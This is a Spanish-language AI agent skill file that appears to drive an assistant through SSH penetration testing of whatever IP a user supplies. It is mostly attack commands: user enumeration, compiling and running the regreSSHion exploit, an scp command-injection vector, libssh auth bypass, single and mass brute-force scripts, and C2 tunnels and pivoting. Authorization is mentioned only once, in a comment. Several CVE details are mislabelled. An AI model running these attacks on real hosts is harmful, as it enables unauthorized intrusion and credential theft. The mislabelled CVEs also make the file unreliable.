---
name: ssh-pentest
description: >
  Usar esta skill SIEMPRE que el usuario quiera realizar pruebas de penetración, auditoría,
  enumeración, fuzzing, explotación o análisis de vulnerabilidades sobre el servicio SSH en
  una IP o FQDN. Activar cuando se mencionen: SSH, OpenSSH, puerto 22, sshd, fuerza bruta SSH,
  CVE SSH, regreSSHion, Terrapin, enumeración de usuarios, cifrados SSH débiles, fuerza bruta SSH,
  túneles ofensivos, captura de banner SSH, o cualquier técnica ofensiva sobre el protocolo SSH.
  También activar cuando el usuario proporcione una IP/FQDN y pida: reconocimiento SSH,
  explotar SSH, POC SSH, vector de ataque SSH, o credenciales SSH. Repositorio de referencia:
  https://github.com/hackingyseguridad/ssha/
---

# Habilidad de Pentesting SSH — hackingyseguridad/ssha

Habilidad de auditoría ofensiva sobre servicios SSH. Cubre todo el ciclo: reconocimiento →
enumeración → análisis de cifrados → explotación de CVEs → fuerza bruta → postexplotación (túneles).

---

## FASE 1 — Reconocimiento e identificación

### 1.1 Captura de banner y versión

```bash
# Obtener versión exacta de OpenSSH
nc -nv <IP> 22
ssh -v <IP> 2>&1 | grep "Remote protocol"
nmap -sV -p 22 --script ssh-hostkey,ssh2-enum-algos <IP>
```

### 1.2 Escaneo de cifrados ofrecidos

```bash
# Con nmap — lista algoritmos KEX, cifrado y MAC
nmap -p 22 --script ssh2-enum-algos <IP>

# Con ssh-audit (más detallado, recomendado)
ssh-audit <IP>
pip install ssh-audit && ssh-audit <IP>

# Scripts del repositorio ssha
bash scanciphers.sh <IP>
bash ssh-audit.sh <IP>
```

### 1.3 Detección de versión vulnerable (decisión rápida)

| Versión OpenSSH detectada | CVEs prioritarios a probar |
|--------------------------|---------------------------|
| 8.5p1 – 9.7p1 | CVE-2024-6387 (regreSSHion) CRÍTICO 9.8 |
| 2.3 – 7.7 | CVE-2018-15473 (enumeración de usuarios) MEDIO 5.3 |
| 5.4 – 7.1 | CVE-2016-0777 (fuga de memoria) MEDIO 4.0 |
| hasta 8.3p1 | CVE-2020-15778 (ejecución remota en cliente) MEDIO 6.8 |
| hasta 7.9 | CVE-2019-6111 (sobreescritura de ficheros) MEDIO 5.7 |
| versiones específicas | CVE-2023-38408 (escalada de privilegios ssh-agent) MEDIO 5.9 |
| 8.5p1 | CVE-2021-41617 (escalada de privilegios sshd) ALTO 7.8 |
| 7.7 – 7.9 | CVE-2019-16905 (caída del servicio) MEDIO 6.8 |
| hasta 8.3 | CVE-2020-14145 (fuga de información) MEDIO 4.3 |
| 7.8 | CVE-2018-15919 (caída del servicio) MEDIO 5.3 |

---

## FASE 2 — Enumeración de usuarios

### CVE-2018-15473 — Enumeración de usuarios (OpenSSH < 7.7)

```bash
# Con script del repositorio ssha (Python)
python3 ssh-username-enum.py <IP> -u root
python3 ssh-username-enum.py <IP> -U /usr/share/wordlists/users.txt

# Con scripts bash del repositorio
bash sshusers.sh <IP>
bash sshuserslist.sh <IP>

# Con Metasploit
use auxiliary/scanner/ssh/ssh_enumusers
set RHOSTS <IP>
set USER_FILE /usr/share/wordlists/metasploit/unix_users.txt
run

# Con nmap NSE
nmap -p 22 --script ssh-auth-methods --script-args="ssh.user=root" <IP>
```

**Indicadores de usuario válido:** diferencia de tiempo en la respuesta (≥300 ms de diferencia).

---

## FASE 3 — Análisis de cifrados débiles (Terrapin / heredados)

### CVE-2023-51767 — Ataque Terrapin (truncamiento de prefijo)

```bash
# Escáner Terrapin (binarios incluidos en el repositorio ssha)
./Terrapin_Scanner_Linux_amd64 <IP>
./Terrapin_Scanner_Linux_i386 <IP>   # para arquitecturas i386

# Script del repositorio
bash terapinscan.sh <IP>
```

**Resultado vulnerable:** `ChaCha20-Poly1305` o `CBC con Encrypt-then-MAC` habilitados sin mitigación.

### Conexión con cifrados heredados u obsoletos (ssha/sshb/sshc)

```bash
# Forzar cifrados obsoletos para comprobar si el servidor los acepta
# Equivalentes a los scripts ssha, sshb, sshc del repositorio
ssh -o KexAlgorithms=diffie-hellman-group1-sha1 \
    -o HostKeyAlgorithms=ssh-rsa \
    -o Ciphers=aes128-cbc \
    usuario@<IP>

# Ver qué cifrados débiles acepta el servidor
nmap -p 22 --script ssh2-enum-algos <IP> | grep -E "weak|insecure|removed"
```

---

## FASE 4 — Explotación de CVEs

### CVE-2024-6387 — regreSSHion (ejecución remota de código como root, CRÍTICO 9.8)
**Afecta:** OpenSSH 8.5p1 – 9.7p1 en Linux con glibc

```bash
# Verificación con NSE (no destructivo)
nmap -p 22 --script CVE-2024-6387.nse <IP>
# O copiar el script del repositorio: https://github.com/hackingyseguridad/ssha/blob/master/CVE-2024-6387.nse

# Prueba de concepto en Python (repositorio ssha)
python3 CVE-2024-6387.py <IP>

# Compilar exploit en C (repositorio ssha — requiere entorno controlado y autorización)
gcc cve-2024-6387.c -o regresshion
./regresshion <IP>

# NOTAS:
# - Es una condición de carrera → requiere miles de intentos (tiempo: horas o días)
# - Funciona mejor en arquitecturas de 32 bits (ASLR predecible)
# - En 64 bits el éxito es estadísticamente bajo por la alta entropía del ASLR
```

### CVE-2018-15473 — Enumeración de usuarios (MEDIO 5.3)
**Afecta:** OpenSSH 2.3 < 7.7

```bash
python3 CVE-2016-6210.py <IP> root
python3 ssh-username-enum.py <IP> -u admin
```

### CVE-2020-15778 — Inyección de comandos en SCP (MEDIO 6.8)
**Afecta:** OpenSSH hasta 8.3p1 — ejecución arbitraria en el cliente vía scp

```bash
# Prueba de concepto: el servidor malicioso inyecta comandos al cliente scp
bash CVE-2020-15778_exploit.sh
python3 cve_2020_15778.py <IP>

# Vector: nombre de fichero con comillas inversas
scp usuario@<IP>:'\`touch /tmp/pwned\`' /dev/null
```

### CVE-2018-10933 — Omisión de autenticación en libssh (CRÍTICO 9.8)
**Afecta:** libssh 0.6.0 – 0.7.5 / 0.8.0 – 0.8.3 (distinto de OpenSSH)

```bash
python3 CVE-2018-10933.py <IP> 22
# Si es vulnerable: acceso sin credenciales mediante MSG_USERAUTH_SUCCESS falso
```

### CVE-2015-6564 — Escalada de privilegios mediante UseLogin

```bash
bash CVE-2015-6564.sh <IP>
```

### CVE-2023-34039 — Omisión de autenticación SSH en VMware Aria

```bash
python3 cve-2023-34039.py <IP>
```

---

## FASE 5 — Fuerza bruta de credenciales

### Scripts del repositorio ssha

```bash
# Fuerza bruta básica (requiere usuarios.txt y claves.txt en el mismo directorio)
bash brutessh.sh <IP>

# Variantes con distinto paralelismo y lógica
bash brutessh1.sh <IP>   # modo secuencial estricto
bash brutessh2.sh <IP>   # paralelo moderado
bash brutessh3.sh <IP>   # con tiempo de espera ajustado
bash brutessh4.sh <IP>   # con retardo antibloqueo
bash brutessh6.sh <IP>   # con rotación de agente SSH
bash brutessh8.sh <IP>   # modo agresivo

# Masivo (múltiples direcciones IP)
bash brutesshmasivo.sh /ruta/a/ips.txt
```

### Herramientas externas recomendadas

```bash
# Hydra — más rápido con paralelismo
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt ssh://<IP> -t 4

# Medusa
medusa -h <IP> -U users.txt -P claves.txt -M ssh

# Ncrack
ncrack -p 22 --user root -P claves.txt <IP>

# Con clave privada encontrada
bash claveprivada.sh <IP> usuario id_rsa_encontrada
bash ssh_claveprivada.sh <IP>
python3 sshpass.sh <IP> usuario clave
```

---

## FASE 6 — Postexplotación y túneles SSH

```bash
# Túnel local (acceso a servicio interno del objetivo)
ssh -L 8080:localhost:80 usuario@<IP>

# Túnel remoto (shell inversa / retrollamada C2)
ssh -R 4444:localhost:4444 usuario@<IP>

# Proxy SOCKS dinámico (pivotaje de red)
ssh -D 9050 usuario@<IP>
proxychains nmap -sT <red_interna>

# Salto entre equipos (ProxyJump)
ssh -J usuario@<IP_pivote>:22 usuario@<IP_objetivo>

# Script de túnel C2 del repositorio
bash tunel_panel_c2.sh <IP> <puerto_c2>
```

Referencia completa: `tuneles_ssh.md` en el repositorio ssha.

---

## FASE 7 — Verificación y registros (evidencias del pentest)

```bash
# Ver intentos de acceso (para documentar el pentest)
bash verlogssh.sh

# Ver conexiones SSH activas
bash verconexiones.sh

# Ver claves del servidor
bash verserverkeys.sh

# Ver versión exacta del servidor
bash versionssh.sh <IP>
bash verssh.sh <IP>
```

---

## PLANTILLA DE HALLAZGO SSH PARA INFORME

```
HALLAZGO:  [Nombre del CVE / Técnica]
Servicio:  SSH / OpenSSH [versión]
IP/FQDN:   [objetivo]
Puerto:    22 (o personalizado)
CVSS v3.1: [puntuación] ([Crítico/Alto/Medio/Bajo])
Vector:    [AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H]

DESCRIPCIÓN:
[Descripción técnica del problema]

PRUEBA DE CONCEPTO / EVIDENCIA:
$ [comando ejecutado]
[salida recortada]

IMPACTO:
[Ejecución remota / Escalada de privilegios / Fuga de información / Caída del servicio / Omisión de autenticación]

REMEDIACIÓN:
- Actualizar OpenSSH a la versión >= [versión parcheada]
- [Medidas adicionales de bastionado]

REFERENCIAS:
- https://nvd.nist.gov/vuln/detail/[CVE]
- https://github.com/hackingyseguridad/ssha/
```

---

## INSTALACIÓN RÁPIDA (Kali Linux)

```bash
# Clonar el repositorio completo
git clone https://github.com/hackingyseguridad/ssha.git
cd ssha

# Instalar dependencias de Python
pip install -r requirements.txt --break-system-packages

# Dar permisos a los binarios
chmod +x Terrapin_Scanner_Linux_amd64 Terrapin_Scanner_Linux_i386
chmod +x ssha sshb sshc sshd

# Instalar dependencias del sistema
bash instalar.sh
```

---

## REFERENCIAS

- Repositorio: https://github.com/hackingyseguridad/ssha/
- Cifrados vulnerables: `ssh_cifrados_vulnerables.md` (en el repositorio)
- Configuración segura de sshd: `configuracion.txt` → `/etc/ssh/sshd_config`
- Túneles SSH ofensivos: `tuneles_ssh.md` (en el repositorio)
- Cifrados heredados de OpenSSH: https://www.openssh.com/legacy.html
